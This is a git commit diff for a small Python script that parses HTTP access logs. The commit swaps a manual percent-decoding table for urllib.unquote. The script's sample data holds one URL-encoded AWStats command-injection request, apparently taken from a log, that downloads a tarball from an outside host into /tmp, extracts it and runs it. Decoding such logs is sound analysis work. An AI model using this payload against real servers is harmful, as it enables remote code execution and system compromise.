e35a6db5cdd7d7f6db0253161ee9423301068fce
Weili Yi <yi@weiliy.net>
2017-04-06 01:10:04 +0800

    use urllib.unquote

--- http_access_header.py
+++ http_access_header.py
@@ -1,5 +1,7 @@
 import re
 import csv
+import urllib
+
 
 file="/home/hduser/Desktop/normailized_log/http_access_export.csv"
 data = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bwget%20www%2eadjud%2ego%2ero%2ft%2etgz%3btar%20zxvf%20t%2etgz%3b%2e%2ft%3becho%20e_exp%3b%2500',
@@ -15,19 +17,6 @@ data = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3
 #         sublist = map(lambda item: item.strip(''), sublist)
 #         data = [i.split(';') for i in sublist][0]
 
-data = map(lambda item: item.replace('%25', '%'), data)
-
-datalist = []
-for i in data:  
-	for code, char in { '%20': ' ', '%21': '!', '%22': '"', '%7C': '|',
-						'%23': '#', '%24': '$', '%26': '&', '%27': '\'',
-						'%28': '(', '%29': ')', '%2A': '*', '%2B': '+',
-						'%2C': ',', '%2D': '-', '%2E': '.', '%2F': '/', 
-						'%3A': ':', '%3B': ';', '%3C': '<', '%3D': '=',
-						'%3E': '>', '%3F': '?', '%40': '@', '%5B': '[',
-						'%5C': '\\', '%5D': '\]', '%5E': '^', '%5F': '_',
-						'%00': '',  '%AF': '', '%35': '5', '%63':'c'}.items():
-			i = i.replace(code.lower(), char)
-	datalist.append(i)
-
-print datalist
+print data
+data = map(lambda item: urllib.unquote(item), data)
+print data
